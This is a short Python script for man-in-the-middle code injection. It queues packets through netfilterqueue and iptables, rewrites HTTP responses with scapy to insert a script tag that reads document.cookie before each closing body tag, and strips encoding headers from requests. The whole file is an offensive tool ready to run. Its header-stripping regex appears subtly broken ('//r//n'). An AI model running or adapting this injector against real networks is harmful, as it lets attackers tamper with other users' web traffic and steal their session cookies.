#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("[*] For Local Use, configure the iptables as well:")
print("\t[-] iptables -I INPUT -j NFQUEUE --queue-num 0")
print("\t[-] iptables -I OUTPUT -j NFQUEUE --queue-num 0")
print("[*] For Network Use, configure the iptables as well:")
print("\t[-] iptables -I FORWARD -j NFQUEUE --queue-num 0")
print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

injected_payload = "<script>alert(document.cookie);</script></body>"

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].cksum
    del packet[scapy.TCP].cksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?//r//n", "", load)
            

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            load = load.replace("</body>", injected_payload)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
            

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()